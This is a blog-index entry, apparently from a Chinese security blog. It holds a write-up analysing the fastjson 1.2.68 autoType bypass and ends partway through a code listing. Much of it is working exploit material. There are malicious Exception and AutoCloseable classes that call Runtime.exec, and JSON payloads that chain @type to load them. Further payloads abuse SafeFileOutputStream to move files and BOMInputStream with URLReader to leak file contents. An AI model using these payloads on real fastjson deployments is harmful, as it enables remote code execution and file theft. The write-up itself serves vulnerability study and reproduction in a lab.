<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>fastjson-1.2.68-bypass</title>
    <link href="/2025/03/28/fastjson-1-2-68-bypass/"/>
    <url>/2025/03/28/fastjson-1-2-68-bypass/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="fastjson-1-2-68-绕过"><a href="#fastjson-1-2-68-绕过" class="headerlink" title="fastjson-1.2.68 绕过"></a>fastjson-1.2.68 绕过</h1><p>在 1.2.47 的利用 mappings 缓存恶意类绕过 autoType 修复后，fastjson 又陆续爆出来了一些黑名单的绕过方式。直到 1.2.68 又有了新的思路去绕过 autoType</p><h2 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h2><p>我们先来看看 fastjson1.2.68 又引入了哪些安全机制</p><p>1.2.68 引入了一个新的安全机制 <strong>safeMode</strong> ，在 checkAutoType()的 1238-1245 行 检测到 safemode 开启的话，直接抛出异常</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323141729168.png" alt="image-20250323141729168"></p><p>所以我们只有关闭 safeMode 的情况下才能进行攻击。</p><p>同时在 1251-1267 行 对 expectClass 的类型进行限制 需要是不是 Object Serializable Cloneable Closeable EventListener Iterable Collection 这些类及其子类</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324120757520.png" alt="image-20250324120757520"></p><p>另外在 1411-1416 行 还对 JNDI 的一些危险类做了判断 clazz 不能是 ClassLoader，DataSource，RowSet 的子类</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324123233834.png" alt="image-20250324123233834"></p><h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>我们先来看 checkAutoType() z 在哪里能返回类</p><p>但是我们发现在 1326-1338 行 会来到一处可以返回类的代码</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324143639179.png" alt="image-20250324143639179"></p><p> 满足 clazz 不为空，expectClass 为空，或 clazz 是 hashmap 的子类 或 clazz 是 expectClass 的子类， 我们就可以返回 clazz 从而绕过 checkAutoType 的判断，这里还是表宽松的</p><p>我们接着看</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324143320508.png" alt="image-20250324143320508"></p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>我们可不可以第一次在 mappings 缓存白名单中找一个可以利用的 deserializer （<span style="color:#FF8000;"> 因为 json 解析的入口就是 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code> 方法，而他的 checkAutoType()方法，默认 exceptClass 传递的值是 null ）</span> ，而这个 deserializer 调用 checkAutoType 时，可以给定可控的 或者 是可利用的 expectClass 参数呢? 从而使得 expectClassFlag 为 true ，让恶意类加载后返回。</p><p>我们接着往下看</p><p>我们能要去寻找调用 chackAutoType 的方法中传入 expcetClass 参数不为空的方法，我们查找用法就只有 <code>JavaBeanDeserializer</code> 和 <code>ThrowableDeserializer</code> 方法中的调用符合条件</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324124027724.png" alt="image-20250324124027724"></p><h3 id="ThrowableDeserializer"><a href="#ThrowableDeserializer" class="headerlink" title="ThrowableDeserializer"></a>ThrowableDeserializer</h3><p>我们进入 com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze 方法 看到有这样一段逻辑</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324124902599.png" alt="image-20250324124902599"></p><p>exClassName 为@type 标签的字符串值 ，把 Throwable 作为 expectClass(期望类) 传给 checkAutoType 了 并把类赋给了 exClass 变量</p><p>绕过 checkAutoType 以后，ThrowableDeserializer#deserialze 就会跟进 exClass 创建异常类了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324130452004.png" alt="image-20250324130452004"></p><blockquote><p>但是由于 mappings 的白名单缓存表里没有 Throwable.class 有的是 Exception.class , 我们不能是继承 Throwable 的类，而要继承 Exception 因为 Exception 是 Throwable 的子类，也符合我们 checkAutoType()的绕过分析</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324131413497.png" alt="image-20250324131413497" style="zoom:50%;" /></blockquote><p>到这里我们已经知道 ThrowableDeserializer#deserialze 是可以利用的，那我们怎么样才能让他自动调用呢？</p><p>在执行完 DefaultJSONParser#parseObject 的 checkAutoType 后会有一段逻辑，是根据 clazz 获取对应的 deserializer </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324135927549.png" alt="image-20250324135927549"></p><p>而在 config.getDeserializer(clazz)中 判断改类是不是 Throwable 的子类，是就创建 ThrowableDeserializer 并返回</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324140326609.png" alt="image-20250324140326609"></p><p>返回后再去调用 Throwable#deserialze 方法</p><p>到这里，我们就把这个调用链理清了</p><p>我们可以测试一下这个流程</p><p><strong>准备 evilException 类，继承 Exception</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.entry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evilException</span> <span class="hljs-keyword">extends</span>  <span class="hljs-title class_">Exception</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>bypass68</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bypass68</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.lingx5.entry.evilException\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们来调试一下，看看执行顺序</p><p><strong>第一次 checkAutoType</strong></p><p>在 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code> 中 </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324145944376.png" alt="image-20250324145944376"></p><p>我们跟进去</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324150453141.png" alt="image-20250324150453141"></p><p>所以 checkAutoType 返回了 java.lang.Exception</p><p>DefaultJSONParser#parseObject 继续往下执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324150833721.png" alt="image-20250324150833721"></p><p>跟进就来到了 <code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code> 方法</p><p><strong>第二次 checkAutoType</strong></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151627072.png" alt="image-20250324151627072"></p><p>跟进 checkAutoType</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151548537.png" alt="image-20250324151548537"></p><p>返回后在 ThrowableDeserializer#deserialze 中实例化</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151811994.png" alt="image-20250324151811994"></p><p>命令执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151833487.png" alt="image-20250324151833487"></p><h3 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h3><p>其实 javaBeanDeserializer 的方式，和上面 Throwable 的思路基本上是一致的，都是利用期望类来绕过，不过这次利用的 AutoCloseable 这个接口</p><p>在 JavaBeanDeserializer#deserialze 中的 checkAutoType 是这样传参数的，其中 expectClass 是跟 type 的值来获取的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328130449037.png" alt="image-20250328130449037"></p><p>我们看 type 是怎么来的，发现是参数传进来的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325094620038.png" alt="image-20250325094620038"></p><p>而在 com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object) 方法中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325094507581.png" alt="image-20250325094507581"></p><p>所以利用基本上就一致了</p><p>我们写一个恶意类 , 实现 AutoCloseable 接口</p><p><strong>evilAutoCloseable</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.entry;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evilAutoCloseable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> &#123;<br>    String cmd;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCmd</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-built_in">this</span>.cmd = cmd;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>AutoCloseableBypass68</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoCloseableBypass68</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.lingx5.entry.evilAutoCloseable\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;cmd\&quot;:\&quot;calc\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325095946017.png" alt="image-20250325095946017"></p><p>我们调试一下，看看是不是跟我们预想的一样</p><p>第一次 checkAutoType 返回 interface java.lang.AutoCloseable 类</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325100337951.png" alt="image-20250325100337951"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325100422623.png" alt="image-20250325100422623"></p><p>接着执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325100752870.png" alt="image-20250325100752870"></p><p>我们步入</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325101102689.png" alt="image-20250325101102689"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325101250512.png" alt="image-20250325101250512"></p><p>再接着就是反序列化 json 串，执行 setter 方法了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325101458444.png" alt="image-20250325101458444"></p><h2 id="AutoCloseable-的一些应用"><a href="#AutoCloseable-的一些应用" class="headerlink" title="AutoCloseable 的一些应用"></a>AutoCloseable 的一些应用</h2><h3 id="fastjson-特性"><a href="#fastjson-特性" class="headerlink" title="fastjson 特性"></a>fastjson 特性</h3><p><span style="color:#FF0000;"> 这里主要是 fastjson 有一个特性，就是如果没有无参构造器的话，fastjson 会根据 json 字符串，扫描构造参数最多的方法进行初始化，并且不再执行 setter 方法 </span></p><table><thead><tr><th>引用</th><th>描述</th></tr></thead><tbody><tr><td>“$ref “:”..”</td><td>上一级</td></tr><tr><td>“$ref “:”@”</td><td>当前对象，也就是自引用</td></tr><tr><td>“$ref”:”$”</td><td>根对象</td></tr><tr><td>“$ref”:”$.children.0”</td><td>基于路径的引用，相当于 root.getChildren().get(0)</td></tr></tbody></table><p><span style="color:#FF0000;"> $ref特性，本来作者的用意是方便实现  JSON 结构的 <strong>引用</strong> 和 <strong>复用</strong>，简单来说：就是json串里要引用之前定义的对象<code>&#123;&#125;包裹</code>就可以很方便的使用$ ref，我们主要就是可以利用它去主动的调用类的 getter 方法 </span></p><p>这里 OutputStream 和 InputStream 默认是实现了 AutoCloseable 接口的，这里是参考 <a href="https://www.anquanke.com/post/id/232774">mi1k7ea</a> 和 <a href="https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g">voidfyoo</a> 师傅文章中的一些文件利用, 拿来复现学习一下</p><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><h4 id="SafeFileOutputStream"><a href="#SafeFileOutputStream" class="headerlink" title="SafeFileOutputStream"></a>SafeFileOutputStream</h4><p>主要还是找到了 <strong>SafeFileOutputStream</strong> 类，它具有移动文件的功能</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们看一下这个类，他有一个构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">SafeFileOutputStream</span><span class="hljs-params">(String targetPath, String tempPath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-built_in">this</span>.failed = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.target = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(targetPath);<br>    <span class="hljs-built_in">this</span>.createTempFile(tempPath);<br>    <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.target.exists()) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.temp.exists()) &#123;<br>            <span class="hljs-built_in">this</span>.output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-built_in">this</span>.target));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><span class="hljs-comment">// target不存在，而tmp存在，就可以复制文件到target</span><br>        <span class="hljs-built_in">this</span>.copy(<span class="hljs-built_in">this</span>.temp, <span class="hljs-built_in">this</span>.target);<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-built_in">this</span>.temp));<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以利用这个，把系统的一些敏感文件，复制到 web 目录下，来进行进一步的渗透</p><p><strong>copyFile</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">copyFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;tempPath\&quot;: \&quot;D:\\\\WebSafe\\\\JavaProject\\\\fastjson\\\\src\\\\main&quot;</span> +<br>            <span class="hljs-string">&quot;\\\\java\\\\com\\\\lingx5\\\\exp\\\\1.txt\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;targetPath\&quot;: \&quot;D:\\\\WebSafe\\\\JavaProject\\\\fastjson\\\\src\\\\main&quot;</span> +<br>            <span class="hljs-string">&quot;\\\\java\\\\com\\\\lingx5\\\\poc\\\\1.txt\&quot;\n&quot;</span> +<br>            <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们创建一个 1.txt</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325151508025.png" alt="image-20250325151508025"></p><p>运行调试一下，来到了 copy 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325152004851.png" alt="image-20250325152004851"></p><p>内部是调用 renameto()方法实现的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325152532946.png" alt="image-20250325152532946"></p><blockquote><p>这就意味着这种方式有潜在的危害，他会把文件 <code>移动/重命名</code> 到目标目录，源文件内容会被置空</p></blockquote><p>执行结果</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325152814277.png" alt="image-20250325152814277"></p><p><span style="color:#FF0000;"> 所以这种功能还是会对目标机器有一定的危害性，谨慎使用 </span></p><h4 id="BOMInputStream"><a href="#BOMInputStream" class="headerlink" title="BOMInputStream"></a>BOMInputStream</h4><p>这个类同样也继承了 AutoCloseable</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326101128853.png" alt="image-20250326101128853"></p><p>网上公开的 POC 是这个样子的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;x&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span>,<br>    <span class="hljs-string">&quot;delegate&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,<br>      <span class="hljs-string">&quot;reader&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span>,<br>        <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;file:///tmp/flag&quot;</span><br>      &#125;,<br>      <span class="hljs-string">&quot;charsetName&quot;</span>: <span class="hljs-string">&quot;UTF-8&quot;</span>,<br>      <span class="hljs-string">&quot;bufferSize&quot;</span>: <span class="hljs-number">1024</span><br>    &#125;,<br>    <span class="hljs-string">&quot;boms&quot;</span>: [&#123;<br>      <span class="hljs-string">&quot;charsetName&quot;</span>: <span class="hljs-string">&quot;UTF-8&quot;</span>,<br>      <span class="hljs-string">&quot;bytes&quot;</span>: [<span class="hljs-number">66</span>]<br>    &#125;]<br>  &#125;,<br>  <span class="hljs-string">&quot;address&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.x.BOM&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>首先用 BOMInputStream 作为了入口</p><p>看一下他的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BOMInputStream</span><span class="hljs-params">(<span class="hljs-keyword">final</span> InputStream delegate, <span class="hljs-keyword">final</span> ByteOrderMark... boms)</span> &#123;<br>    <span class="hljs-built_in">this</span>(delegate, <span class="hljs-literal">false</span>, boms);<br>&#125;<br><span class="hljs-comment">// 重载</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BOMInputStream</span><span class="hljs-params">(<span class="hljs-keyword">final</span> InputStream delegate, <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> include, <span class="hljs-keyword">final</span> ByteOrderMark... boms)</span> &#123;<br>    <span class="hljs-built_in">super</span>(delegate);<br>    <span class="hljs-keyword">if</span> (IOUtils.length(boms) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;No BOMs specified&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">this</span>.include = include;<br>    <span class="hljs-keyword">final</span> List&lt;ByteOrderMark&gt; list = Arrays.asList(boms);<br>    <span class="hljs-comment">// Sort the BOMs to match the longest BOM first because some BOMs have the same starting two bytes.</span><br>    list.sort(ByteOrderMarkLengthComparator);<br>    <span class="hljs-built_in">this</span>.boms = list;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ByteOrderMark (字节顺序标记) 是一个位于文本文件或数据流 <strong>开头</strong> 的特殊 Unicode 字符 (<code>U+FEFF</code>)，主要是用来 <strong>标识文本的字节序 (Endianness) 和 编码方式 (Encoding)</strong>。</p></blockquote><p><span style="font-style:italic;"> 这个 boms 数组的传递也是我们攻击的关键，我们这个攻击链实际上就是根据 boms 数组来碰撞出文件的内容的（后面也会详细提到）</span></p><p>我们给 delegate 这个输入流传入的是 ReaderInputStream 调用这个构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ReaderInputStream</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Reader reader, <span class="hljs-keyword">final</span> CharsetEncoder encoder, <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> bufferSize)</span> &#123;<br>    <span class="hljs-built_in">this</span>.reader = reader;<br>    <span class="hljs-built_in">this</span>.encoder = encoder;<br>    <span class="hljs-built_in">this</span>.encoderIn = CharBuffer.allocate(bufferSize);<br>    <span class="hljs-built_in">this</span>.encoderIn.flip();<br>    <span class="hljs-built_in">this</span>.encoderOut = ByteBuffer.allocate(<span class="hljs-number">128</span>);<br>    <span class="hljs-built_in">this</span>.encoderOut.flip();<br>&#125;<br></code></pre></td></tr></table></figure><p>主要是规定了 字节编码和缓冲区大小，而给 Reader 赋值 URLReader 对象，利用 URLReader 支持的伪协议 <code>file://</code> 来打开文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">URLReader</span><span class="hljs-params">(URL url)</span> &#123;<br>    <span class="hljs-built_in">this</span>(url, (Charset)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">URLReader</span><span class="hljs-params">(URL url, Charset cs)</span> &#123;<br>    <span class="hljs-built_in">this</span>.url = (URL)Objects.requireNonNull(url);<br>    <span class="hljs-built_in">this</span>.cs = cs;<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里把读取文件要用到的类封装完成了。</p><p>利用$ref 去调用 BOMInputStream 的 getBom 方法 ，我们来看一下这个方法</p><p>in 是我们传递的 ReaderInputStream，再去调 URLReader 的 read() 方法，读取文件，细节就不过多赘述了</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326133546934.png" alt="image-20250326133546934" style="zoom:67%;" /><p>后边的内容，我们通过注释应该也可以知道，就是去对比 firstBytes 和 boms 数组是否匹配</p><h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>我们来执行 POC 看一下</p><p>创建一个 1.txt 文件，内容写了 12</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326140432459.png" alt="image-20250326140432459"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span 